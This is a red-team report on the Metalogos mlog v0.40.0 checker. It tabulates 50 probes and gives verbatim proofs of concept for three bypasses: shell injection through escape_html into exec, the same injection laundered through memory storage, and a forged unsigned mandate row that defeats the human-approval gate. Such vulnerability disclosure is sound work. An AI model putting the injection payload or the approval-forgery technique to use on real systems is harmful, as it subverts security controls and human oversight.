# Red-Team Pass 982 — Metalogos `mlog` v0.40.0 (independent black-box adversary)

- **Date:** 2026-11-19
- **Binary:** `mlog982`, SHA256 `c2bfee65b800675014a3c107e8443f29c5d76209f2371ef6ad54c883d007b13b`
- **Posture statement:** I am an independent adversary. I did not write this program, I have no source, tests, design docs or change history, and no merge rights. My only inputs were the binary and the promise sheet (reproduced verbatim in `pocs/PROMISES.md`). I read no repository material; during a filesystem search for the staged binary, repository *file names* appeared in `find` output — I read none of them and disregarded them. I ran no git commands, no network probes (all sink URLs are non-routable: `127.0.0.1:9`), and I did not open the earlier passes' artifacts (their pocs/reports), so the comparison line below is necessarily limited.

## Executive summary

- **Probe count:** 50 distinct probe programs (`qNN_*.mlog`, 55 evidence rows counting env-var variants of the same program). Scratch transcripts: `pocs/` (this directory, copied from `/tmp/adversary-980/pocs982/`).
- **Verdicts:** **3 BYPASS findings** (4 unconditional rows + 1 conditional chain; two of the three share one root cause), **1 INCONCLUSIVE**, everything else **CAUGHT** (promise held).
- **Binary staging note:** the promised staging directory `/tmp/adversary-980/` did not exist. I recreated it and staged the candidate from the environment's pass-982 build `/tmp/mlog_982final` (SHA256 above). Other same-day builds present in the environment (`/tmp/mlog_982` 5635ef2f…, `/tmp/mlog_982b` ec24ec13…, `/tmp/mlog_base982` 64f5a0d7…, `redteam-bin/mlog-v0.40.0` bedb6d29…) all self-report `mlog 0.40.0`; I selected the build explicitly named for pass 982 ("final") and report its hash.
- **Difference from the earlier same-day passes:** I cannot tell — comparing would have required reading their artifacts, which my independence contract forbids. What I can say: this pass attacked the storage-laundering dimension hard (14 of the requested storage attack dimensions are covered by dedicated probes q15–q28, q43–q47) and found that the storage layer itself is *not* the weak point; the weak point is the sanitizer-label policy (`escape_html`) and the unsigned mandate store.

### The three bypass findings (details in the sections below)

1. **`escape_html()` clears the `exec` gate** — untrusted data that has passed through the *HTML* escaper drives shell execution; `check` passes and `run` (with the documented host exec permit) executes attacker shell text (proof-of-execution marker file created).
2. **The same, laundered through the memory store** — `escape_html(q)` → `mem_set` → `mem_get` → `exec`: the storage round-trip preserves the downgraded (trusted) label and the shell payload fires. Storage does not re-taint — but here storage is not even needed for the taint loss; the loss happens inside `escape_html` itself, and storage faithfully preserves the already-lost mark.
3. **The human-oversight mandate store accepts unsigned, program-forged rows** (conditional) — with operator env `METALOGOS_SENSITIVE_PATH_ALLOWLIST` + `METALOGOS_MANDATE_STORE` pointing at a writable path, a program whose `check` PASSES writes a forged `actor_verified: true` mandate row (the rows are plain unsigned JSON) and a second program's `cron_run` then executes (exit 0), identical to a genuine host approval. Under default env the runtime sandbox refuses the store write (fail-closed) — the conditional precondition is stated plainly.

## Method notes

- Probes are `pattern`/`flow` programs; flows must end in `-> output` (an optional label declaration `output<public, untrusted>` marks the display as intended). Where a probe's flow terminator would emit a spurious join-noise error (the checker joins ALL of a pattern body's interactions into the pattern's return label), I declared the terminator label so the load-bearing sink errors are attributable; this is documented per row where relevant.
- `METALOGOS_STATIC_LABEL_GATE_OFF=1` was used **only** in `run` probes, per the promise sheet's sanction, to test the runtime label line beneath the silenced static gates.
- `METALOGOS_ALLOW_EXEC=1` is the sheet's documented "named host permit for exec" — the sanctioned precondition under which exec protections are supposed to hold.
- Verdict discipline: BYPASS = promise text broken by observed behavior (check passes and/or data flows to the forbidden place). Inconclusive probes are not counted as bypasses. CAUGHT is reported honestly.

## Full probe table

Check verdict: REFUSE (exit 1, classes quoted) / PASS (exit 0). Run verdict: refused / executed / n.a. (unreachable because check refuses — `run` re-runs the static line first, observed on q43).

| Probe | Promise | check | run | Verdict | One-line evidence |
|---|---|---|---|---|---|
| q01_secret_print | P1 | REFUSE `[SECRET_LEAK]`+`[PII_EGRESS_OUTPUT]` | n.a. | CAUGHT | env→print refused at compile time |
| q02_secret_http_post | P1 | REFUSE `[SECRET_LEAK]`+`[PII_EGRESS_NETWORK]` | n.a. | CAUGHT | env→http_post body refused |
| q03_secret_write_file | P1 | REFUSE `[SECRET_LEAK]`×2 | n.a. | CAUGHT | env→write_file refused |
| q04_secret_exec | P1 | REFUSE `[SECRET_TO_EXEC]` | n.a. | CAUGHT | env→exec refused (secret-exec threshold) |
| q05_secret_storage3 | P1 | REFUSE `[TAINT_PERSISTENCE]`+`[PII_EGRESS_NETWORK]`×2 | n.a. | CAUGHT | env→mem_set, session_set, kv_set ALL refused |
| q06_secret_b64_roundtrip | P1 | REFUSE `[SECRET_LEAK]` | n.a. | CAUGHT | base64 round-trip does not wash the secret label |
| q07_sql_untrusted_concat | P2 | REFUSE `[SQL_DYNAMIC]` | n.a. | CAUGHT | query_param concatenated into db_execute refused |
| q08_sql_literal_ok | P2 | PASS | n.a. | CAUGHT (control) | literal SQL allowed as promised |
| q09_llm_respond_html | P3 | REFUSE `[HTML_INJECTION]`+`[TAINT_INTERP]` | n.a. | CAUGHT | LLM output to respond_html refused 3 ways |
| q10_readfile_respond_html | P3 | REFUSE `[HTML_INJECTION]` | n.a. | CAUGHT | read_file→respond_html refused |
| q11_queryparam_exec | P3 | REFUSE `[UNTRUSTED_EXEC_DECISION]` | n.a. | CAUGHT | untrusted→exec refused statically |
| q12_struct_fields | P3 | REFUSE ×2 (PName and PTag) | n.a. | CAUGHT | whole struct tainted (coarse, conservative) |
| q13_list_elements | P3 | REFUSE ×2 (PFirst and PSecond) | n.a. | CAUGHT | whole list tainted (coarse, conservative) |
| q14_flow_propagation | P3 | REFUSE at output | n.a. | CAUGHT | untrusted mark crosses user pattern call + flow |
| q15_mem_roundtrip | P3/storage | REFUSE `[TAINT_PERSISTENCE]` at mem_set | n.a. | CAUGHT | raw untrusted cannot be stored |
| q16_mem_key_confusion | P3/storage | REFUSE at dirty-key store | n.a. | CAUGHT | key confusion moot: store itself refuses |
| q17_session_roundtrip | P3/storage | REFUSE `[UNTRUSTED_EGRESS_NETWORK]` at session_set arg 2 | n.a. | CAUGHT | session store refuses untrusted |
| q18_kv_roundtrip | P3/storage | REFUSE `[TAINT_PERSISTENCE]` | n.a. | CAUGHT | kv store refuses untrusted |
| q19_escape_before_store | P3/storage | PASS | executed (escaped output) | CAUGHT (control) | escape-before-store is the sanctioned path |
| q20_file_roundtrip_same_run | P3/storage | REFUSE at respond_html | n.a. | CAUGHT | read_file re-marks untrusted, same run |
| q21_file_path_confusion | P3/storage | REFUSE at respond_html | n.a. | CAUGHT | write A / read B: read re-marks regardless of path |
| q22_append_accumulate | P3/storage | REFUSE at respond_html | n.a. | CAUGHT | appended accumulation still re-marked on read |
| q23_escape_exec | P3 | **PASS** | n.a. (see q23r) | **BYPASS** | escape_html(q)→exec passes the static exec gate |
| q23r_escape_exec_file | P3 | **PASS** | **executed** | **BYPASS** | attacker shell text ran; PWNED_982_MARKER created |
| q24_escape_http_post | P3 | PASS | refused (capability gate on http_post, before action) | CAUGHT | network egress of unsanitized untrusted is outside the promise text; runtime capability gate blocked it anyway |
| q25_escape_sql | P2 | REFUSE `[SQL_DYNAMIC]` | n.a. | CAUGHT | SQL gate keys on dynamic-ness, not the label |
| q26_escape_mem_exec | P3+storage | **PASS** | n.a. (see q26r) | **BYPASS** | escape→mem_set→mem_get→exec passes static gates |
| q26r_escape_mem_exec_file | P3+storage | **PASS** | **executed** | **BYPASS** | laundered-through-memory shell payload ran; marker created |
| q27_stored_if_exec | P3/storage | PASS | executed, else-branch (print) | CAUGHT (control) | stored literal drives decisions; guarded exec branch |
| q28_trusted_overwrite_untrusted | P3/storage | REFUSE at 2nd store | n.a. | CAUGHT | overwrite-with-untrusted refused |
| q30_sensitive_vocab | P6/P3 | REFUSE `[SECRET_LEAK]` | n.a. | CAUGHT | writing `.env` marks content private; `api.key` read → private |
| q31_mandate_store_write | P4-adjacent | PASS | refused `[SANDBOX_SENSITIVE_PATH]` | CAUGHT | runtime sandbox protects the mandate store path (static does NOT) |
| q32_cron_no_approval | P4 | PASS | refused `IRREVERSIBLE_NO_GRANT`, exit 1, before action | CAUGHT | no mandate → refuse before action |
| q32 + host `mlog approve` (control) | P4 | PASS | executed, exit 0 | CAUGHT (control) | genuine host mandate enables cron_run |
| q32 against FORGED store (q34e) | P4 | PASS | **executed, exit 0** | **BYPASS (conditional)** | forged unsigned mandate row accepted |
| q33_cron_inprogram_approval | P4 | PASS | refused `IRREVERSIBLE_NO_GRANT` | CAUGHT | in-program approval_issue never counts (fail-closed, stricter than sheet) |
| q34_forged_mandate | P4 | PASS | refused `[SANDBOX_SENSITIVE_PATH]` | CAUGHT | default env: store write refused |
| q34c_abs_store | P4 | PASS | refused `[SANDBOX_SENSITIVE_PATH]` | CAUGHT | absolute store path refused |
| q34d_trav_store | P4 | PASS | refused `[SANDBOX_SENSITIVE_PATH]` | CAUGHT | traversal path refused |
| q34e (q34 + allowlist env) | P4 | PASS | executed (store written) | **BYPASS (conditional)** | with `METALOGOS_SENSITIVE_PATH_ALLOWLIST`, forged store lands |
| q35_exec_no_permit | P5 | PASS | refused `IRREVERSIBLE_NO_GRANT` (capability), exit 1 | CAUGHT | exec refuses before action without permit |
| q35 + `METALOGOS_ALLOW_EXEC=1` (control) | P5 | PASS | executed | CAUGHT (control) | documented host permit enables exec |
| q37_exec_profile_cap | P5 | PASS | refused `[EXEC_NOT_PERMITTED]` | CAUGHT | profile capability permit is NOT sufficient for exec (fail-closed; stricter than sheet wording) |
| q38_gitpush_no_cap | P5 | PASS | refused `IRREVERSIBLE_NO_GRANT` (capability) | CAUGHT | git_push refuses before action |
| q39_serve_env_exec | P6 | PASS | serve banner: route exec denied, route env denied; control env flips to ENABLED | CAUGHT | serve gates live and toggle exactly per promise |
| q41_serve_sensitive | P6 | PASS (only a headers warning) | serve starts; route bodies unreachable (route_decl syntax not discoverable) | INCONCLUSIVE | static line does NOT refuse reading `.env`; serve-time enforcement could not be exercised |
| q42_writer | P3/storage | PASS | executed (carry.html written) | CAUGHT (control) | untrusted→write_file allowed per promise text (only secrets→file refuse) |
| q43_reader_second_run | P3/storage | REFUSE | default run: static refuse; GATE_OFF run: **runtime refuse** `[SINK_CLEARANCE_RUNTIME]` | CAUGHT | process boundary does NOT launder: reader re-marks |
| q44_gateoff_readfile_html | P3 | REFUSE | GATE_OFF run: **runtime refuse** `[SINK_CLEARANCE_RUNTIME]`/HTML_INJECTION | CAUGHT | runtime label line independent of static gates |
| q45_gateoff_mem_launder | P3/storage | REFUSE | GATE_OFF run: **runtime refuse** at mem_set (TAINT_PERSISTENCE) | CAUGHT | runtime refuses storing untrusted even with static off |
| q46_gateoff_llm_mem | P3/storage | REFUSE | GATE_OFF+`METALOGOS_MOCK_LLM=1` run: **runtime refuse** at mem_set | CAUGHT | runtime labels survive mock LLM → storage attempt |
| q47_gateoff_secret_mem | P1/storage | REFUSE | GATE_OFF run: **runtime refuse** at mem_set ('private, trusted') | CAUGHT | secret→b64→mem→other-key refused at runtime too |
| q48_gateoff_readfile_exec | P3 | REFUSE | GATE_OFF run: **runtime refuse** `[UNTRUSTED_EXEC_DECISION]` | CAUGHT | differential baseline: raw untrusted→exec refused at runtime |
| q49_render_exec | P3 | PASS | refused (`render(): unknown template`) | CAUGHT | render is a template lookup, not a string sanitizer; runtime fails closed by accident — static gate still passed (see Observations) |

## BYPASS evidence (verbatim)

### BYPASS 1 and 2 — `escape_html()` downgrades the label below the exec gate (Promise 3), direct and storage-mediated

Root cause: the checker (and the runtime label line) treat `escape_html(x)` as trusted/sanitized for ALL downstream sinks. For `exec` this is wrong: HTML escaping does not neutralize shell metacharacters (`;`, `$`, backticks, `|`). The promise sheet's `escape_html` exemption is written for HTML/public outputs; here it also washes the exec path.

Payload file `in.html` (attacker-controlled content):

```
abc; touch PWNED_982_MARKER; # tail
```

Probe `q23r_escape_exec_file.mlog` (direct):

```
pattern P(d: String) -> String {
  let q = read_file("in.html")
  let safe = escape_html(q)
  exec("echo " + safe)
  return "ok"
}
flow Main { input: String = "x" -> P -> output<public, untrusted> }
```

Observed — check:

```
$ mlog982 check q23r_escape_exec_file.mlog
OK: no issues found.
exit=0
```

Observed — run (with the sheet-documented host exec permit):

```
$ METALOGOS_ALLOW_EXEC=1 mlog982 run q23r_escape_exec_file.mlog
ok
exit=0
$ ls -la PWNED_982_MARKER && echo MARKER-CREATED-BY-ATTACKER-SHELL
-rw-r--r-- 1 z z 0 Nov 19 17:29 PWNED_982_MARKER
MARKER-CREATED-BY-ATTACKER-SHELL
```

The attacker's shell statement (`touch PWNED_982_MARKER`) executed. Transcript: `pocs/q23r_evidence.txt` (also `pocs/q23r_run2.out.txt`; first attempt with a `&quot;`-bearing payload produced `sh: 1: Syntax error: "&" unexpected` — direct proof the escaped attacker string reached `/bin/sh` — in `pocs/q23r_run.out.txt`). Same shape with a pure `query_param` source, `q23_escape_exec.mlog`, also check-PASSES.

Probe `q26r_escape_mem_exec_file.mlog` (storage-mediated — the pass focus):

```
pattern P(d: String) -> String {
  let q = read_file("in.html")
  let safe = escape_html(q)
  mem_set("k", safe)
  let g = mem_get("k")
  exec("echo " + g)
  return "ok"
}
flow Main { input: String = "x" -> P -> output<public, untrusted> }
```

Observed — check `OK: no issues found.` (exit 0); run `ok` (exit 0) and the marker file was created again:

```
$ METALOGOS_ALLOW_EXEC=1 mlog982 run q26r_escape_mem_exec_file.mlog
ok
exit=0
-rw-r--r-- 1 z z 0 Nov 19 17:29 PWNED_982_MARKER
MARKER-CREATED-VIA-MEM-LAUNDERED-VALUE
```

Transcript: `pocs/q26r_evidence.txt`. Notes:
- The storage round-trip (`mem_set`/`mem_get`) preserves whatever label the value already carries; the taint loss happens inside `escape_html`. Storage neither launders nor re-taints — both were tested (q45/q47 prove the runtime DOES re-refuse raw untrusted/private stores).
- Differential proof that the runtime label line is otherwise intact: with the static gates silenced, raw untrusted→exec is refused at runtime (q48: `[SINK_CLEARANCE_RUNTIME] ... exec argument #0 carries label 'public, untrusted' ... UNTRUSTED_EXEC_DECISION`, exit 1). The ONLY difference in the bypassing program is the `escape_html()` call.
- Preconditions: `METALOGOS_ALLOW_EXEC=1` (the sheet's documented named host permit). Without it, exec refuses for everyone (capability gate) — but `check` passes unconditionally, and the promise sheet defines a BYPASS as "a program where a promise above says 'refuses' but check PASSES (and/or run executes …)".
- `render()` has the same static hole (q49 check-PASSES) but refuses at runtime via template lookup (`render(): unknown template '…'`) — fail-closed by accident, not by the label line.

### BYPASS 3 — unsigned mandate store: a program can mint its own human-oversight approval (Promise 4, conditional on operator env)

Facts established by the probe chain:

1. The mandate store is plain unsigned JSON. A genuine host approval (`mlog approve carrier:cron_run --actor redteam-adversary --ttl 600`) writes `{"mandates":[{"actor":…,"target_digest":"94aec09ef10d33dbadde4314d7189aa9a7f6163f61717b7ca8671bc2e3ca98d0","granted_at":…,"expires_at":…,"revoked":false,"actor_verified":true}]}`. `94aec09e…` is exactly `sha256("carrier:cron_run")` — no secret material, no signature.
2. A program whose **check PASSES** can attempt to write that store (q34/q34c/q34d all `check` exit 0 — the static line has NO vocabulary for the mandate store; it is not in the printed static deny-list).
3. Under default env the runtime sandbox refuses all three write shapes (`mandates.json`, absolute `/home/z/.metalogos/mandates.json`, traversal) with `[SANDBOX_SENSITIVE_PATH] … exit=1` — fail-closed, CAUGHT.
4. With operator env `METALOGOS_SENSITIVE_PATH_ALLOWLIST=mandates.json` (the error message's own sanctioned knob) and `METALOGOS_MANDATE_STORE=mandates.json`, the write executes (`ok`, exit 0) and the forged row lands.
5. A second program (`q32_cron_no_approval.mlog`, containing only `cron_run("job1")`) then **executes with exit 0** against the forged store — identical to the genuine-host-approval control, and in contrast to the baseline refusal (no store → `IRREVERSIBLE_NO_GRANT`, exit 1).

Probe `q34_forged_mandate.mlog` (check exit 0):

```
pattern P(d: String) -> String {
  write_file("mandates.json", "{\"mandates\": [{\"actor\": \"forged-in-program\", \"target_digest\": \"94aec09ef10d33dbadde4314d7189aa9a7f6163f61717b7ca8671bc2e3ca98d0\", \"granted_at\": 1795000000, \"expires_at\": 2000000000, \"revoked\": false, \"actor_verified\": true}]}")
  return "ok"
}
flow Main { input: String = "x" -> P -> output<public, untrusted> }
```

Observed:

```
$ rm -f mandates.json
$ METALOGOS_MANDATE_STORE=mandates.json mlog982 run q34_forged_mandate.mlog     # default, no allowlist
error: [SANDBOX_SENSITIVE_PATH] write_file('mandates.json'): the path matches the sensitive-path deny-list …
exit=1
$ METALOGOS_SENSITIVE_PATH_ALLOWLIST=mandates.json METALOGOS_MANDATE_STORE=mandates.json mlog982 run q34_forged_mandate.mlog
ok
exit=0
$ METALOGOS_MANDATE_STORE=mandates.json mlog982 run q32_cron_no_approval.mlog   # cron against the FORGED store
ok
exit=0
```

Baseline without any store: `IRREVERSIBLE_NO_GRANT … exit=1` (`pocs/q32_run.out.txt`). Genuine-host control: `ok exit=0` (`pocs/q32_host.out.txt`). Forged-store run: `ok exit=0` (`pocs/q32_forged.out.txt`, `pocs/q34e_run.out.txt`).

Honest caveat (stated plainly): this chain requires the operator environment to grant the path allowlist and to point `METALOGOS_MANDATE_STORE` at a program-writable path. Under default env the runtime sandbox blocks the write (fail-closed). The unconditional part of the finding is: **`check` passes a program that writes the approval-mandate store** (the static line has no mandate-store vocabulary), and **the approval gate does not authenticate mandate rows** — any JSON with `actor_verified: true` and a fresh `expires_at` counts, so the security of Promise 4 rests entirely on the filesystem write-permission layer.

## Notable CAUGHT observations

- **Storage static line (P1/P3):** all three storage sinks (`mem_set`, `session_set` arg 2, `kv_set`) refuse BOTH private and untrusted values at compile time (q05, q15, q17, q18). Storage cannot be poisoned by a checked program.
- **Storage runtime line:** with `METALOGOS_STATIC_LABEL_GATE_OFF=1`, the runtime refused every storage-laundering attempt (`[SINK_CLEARANCE_RUNTIME]`, classes TAINT_PERSISTENCE / HTML_INJECTION / UNTRUSTED_EXEC_DECISION) — q43–q48. The runtime label line is real, independent of the static gates, and re-marks `read_file` data across process boundaries (q43 two-run pair).
- **Structs/lists are over-tainted (coarse join):** a dirty field poisons sibling fields (q12 PTag refused) and a dirty element poisons the whole list (q13 PSecond refused). Conservative direction — no bypass, but a usability cost.
- **Pattern return joins:** ANY interaction with dirty data inside a pattern taints the pattern's return value ("merged control-flow state"), even `return "ok"` after a sink call. All probes returning literals after dirty work show this join-noise error at the flow terminator unless the terminator label is declared.
- **Transforms preserve labels:** `base64_encode/decode`, `to_string`/`str`, `json_encode`/`parse_json` round-trip, `join(split())`, `replace`, `format`, `upper`/`trim`/`substring` — none wash the untrusted mark (p1–p8 series in pocs/). `redact` exists (2-arg) and is the sanctioned downward move; `render` is a template lookup, not a sanitizer.
- **Approval is fail-closed (P4):** in-program `approval_issue` never counts (q33 refused even with a host store present); no store → refuse before action with `IRREVERSIBLE_NO_GRANT`, exit 1. The binary is stricter than the promise sheet here (the sheet implies `approval_issue` records a counting mandate; the binary says `actor_verified=false` and never counts).
- **Capability layer (P5):** `exec`, `git_push`, `http_post` all refuse at run with `IRREVERSIBLE_NO_GRANT` before the action without a covering grant/permit. Notably `profile capability { allow_carrier: exec }` is NOT sufficient for exec (`[EXEC_NOT_PERMITTED]` — exec additionally requires the host env permit); fail-closed, though it diverges from the sheet's wording.
- **Serve (P6):** startup banner enforces and documents the gates: `route exec: denied (set METALOGOS_SERVE_ALLOW_EXEC=1 …)`, `route env: denied (… or METALOGOS_ENV_ALLOWLIST=…)`; with the env vars the banner flips to ENABLED. Limitation: the `route_decl` grammar inside `mlogserver` could not be discovered by probing (10+ shapes tried; see pocs/r4*, s*, u*, v* transcripts), so serve enforcement could only be exercised at the banner level — hence q41 (static check does NOT refuse reading `.env` in a non-route pattern) is INCONCLUSIVE.
- **Bytecode lane closed:** `mlog compile` re-runs the Category A security invariants and refuses refused programs (`[SQL_DYNAMIC]`, `[TAINT_PERSISTENCE]`) — no compile-to-bytecode bypass found.
- **Imports re-analyzed:** a dirty imported module triggers `[SECRET_LEAK]` when checking the importing main file (`--root` resolution works; without it the import fails closed with an undefined-function error).
- **Sensitive-path vocabulary (static):** writing to `.env` makes the written content 'private, trusted' and refuses via `[SECRET_LEAK]` (q30); `api.key` reads come back private too. The runtime deny-list printed by the sandbox: `.env*, *.db*, *.pem, *.key, id_rsa*, id_ed25519*, .netrc, .npmrc, credentials*, *.sqlite*, .git/**, metalogos.toml, .mlog/**` — note the mandate store is protected at runtime beyond this list (q34/q31 refusals), but not in the static list.

## Verdict counts

- Probe programs: **50** (`qNN_*.mlog`); evidence rows incl. env-variants: **55**.
- **BYPASS rows: 6** (q23, q23r, q26, q26r unconditional; q34e + q32-forged conditional) → **3 distinct bypass findings**.
- **INCONCLUSIVE: 1** (q41, serve sensitive-path enforcement unreachable — route grammar).
- **CAUGHT: 48** rows (including 8 explicit controls that confirm allowed behavior matches the promises).

## Numbered list of BYPASSes

1. **q23 / q23r_escape_exec_file (Promise 3 — "Untrusted data driving exec refuses"):** untrusted file content passed through `escape_html()` drives `exec()`; `mlog check` PASSES (exit 0), and with the documented host permit `METALOGOS_ALLOW_EXEC=1` the run executes attacker shell text — the marker file `PWNED_982_MARKER` was created by `touch` inside the attacker-controlled string. HTML escaping does not neutralize shell metacharacters; the label downgrade it grants is trusted by both the static and the runtime exec gates.
2. **q26 / q26r_escape_mem_exec_file (Promise 3 + the storage focus):** the same payload laundered through the memory store — `escape_html(q)` → `mem_set("k", …)` → `mem_get("k")` → `exec("echo " + g)`; check PASSES and the run again created `PWNED_982_MARKER`. Storage preserves the already-downgraded label, so store-then-read-back changes nothing — the hole is the sanitizer-label policy, which storage faithfully carries into the exec sink.
3. **q34_forged_mandate (as q34e) → q32_cron_no_approval (Promise 4 — human-oversight approval; CONDITIONAL on operator env `METALOGOS_SENSITIVE_PATH_ALLOWLIST` + `METALOGOS_MANDATE_STORE`):** a program whose check PASSES writes a forged, unsigned `actor_verified: true` mandate row into the host-owned mandate store, after which `cron_run` executes with exit 0 — no `approval_issue`-recorded mandate existed anywhere. The mandate rows carry no signature or MAC, and `target_digest` is merely `sha256("carrier:cron_run")`. Under default env the runtime sandbox refuses the store write (fail-closed), which is the only reason this is conditional; the static line never refuses it.
